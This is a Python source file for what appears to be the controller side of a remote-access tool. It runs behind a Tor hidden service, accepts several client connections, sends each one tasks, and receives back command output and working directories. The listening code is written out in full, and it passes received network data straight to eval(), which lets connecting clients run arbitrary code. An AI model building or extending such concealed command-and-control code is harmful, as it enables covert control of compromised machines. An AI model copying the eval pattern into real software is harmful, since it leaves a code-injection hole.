import socket
import threading
import sys
from style import Style
import os

"""
A class to handle the tor hidden service.
Note: The stem library could be used to interact with tor but it is
rather annoying to use (maybe change in the future).
"""
class TorHiddenService(Style):
    BASE_DIR = '/var/lib/tor/'

    def __init__(self, name, lPort, fPort):
        self.name = name
        # listen and forward port configured in /etc/tor/torrc
        self.lPort = lPort
        self.fPort = fPort
        if self.exists():
            self.posSysMsg('An existing hidden serivce was found')
            with open(os.path.join(self.BASE_DIR, self.name + '/hostname'), 'r') as f:
                self.posSysMsg('Address: {}'.format(f.read()))
        else:
            self.negSysMsg('No hidden service was found in {}'.format(self.BASE_DIR))
            self.negSysMsg('Please configure a hidden service to listen on {} 127.0.0.1:{}'.format(self.lPort, self.fPort))
            sys.exit(1)
        
    def exists(self) -> bool:
        path = os.path.join(self.BASE_DIR, self.name)
        if os.path.isdir(path):
            return True
        return False
        

"""
A class to handle the listener socket.
It also handles the en- and decoding and the network protocoll.
"""
class ListenerSocket(Style, threading.Thread):
    MAX_CONNECTIONS = 10

    def __init__(self, port):
        threading.Thread.__init__(self)
        threading.Thread.daemon = True
        self.bindAddr = ('127.0.0.1', port)
        # <self.__sock> should not be accessed from outside the class.
        self.__sock = self.create()
        self.__clients = []

    def create(self) -> socket.socket:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # allow address reuse
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(self.bindAddr)
            sock.listen(self.MAX_CONNECTIONS)
        except socket.error as error:
            self.negSysMsg(error)
            sys.exit(1)
        else:
            self.posSysMsg('Created socket')
            return sock
    """
    The <start> method runs as a thread and endless.
    It handles all incoming client connections and stores the according 
    client objects in <self.__clients>. 
    """
    def run(self):
        self.posSysMsg('Listening for clients') 
        while True:
            try:
                clientObjects = self.__sock.accept()
                client = Client(clientObjects)
                self.__clients.append(client)
                # Dont print any client address info since the connection works over
                # tor hidden services and the address info would be about the exit node.
                print()
                self.posSysMsg('Client connected to the server')
            except socket.error as error:
                self.negSysMsg(error)
                sys.exit(1)

    def getClients(self):
        return self.__clients

    def getClient(self, index):
        return self.__clients[index] 

"""
A class the handles the interaction between the listener and the client.
It should NOT be accessed from outside the module.
"""
class Client(Style):
    def __init__(self, clientObjects):
        self.__conn, self.__addr = clientObjects

    """
    The Listener always sends a dictionary containing, 
    A task and a list of optional arguments.
    """
    def send(self, task, args):
        try:
            data = {'task' : task, 'args' : args}
            data = str(data)
            self.__conn.send(data.encode('utf-8'))
        except socket.error as error:
            self.negSysMsg('Error while sending: '.format(error))
            sys.exit(1)
        else:
            self.posSysMsg('==> send {} bytes'.format(sys.getsizeof(data)))

    """
    The client always sends back the output of the current task, 
    and the current working directory as a dictionary.
    """
    def receive(self, buffersize):
        try:
            data = self.__conn.recv(buffersize)
            # get length in bytes before unpacking data
            dataNumBytes = sys.getsizeof(data)
            # decode from bytes to string
            data = data.decode('utf-8')
            # decode from string to dictionary
            data = eval(data)
        except socket.error as error:
            self.negSysMsg('Error while receiving: '.format(error))
            sys.exit(1)
        else:
            self.posSysMsg('<== received {} bytes'.format(dataNumBytes))
            return data['output'], data['cwd']
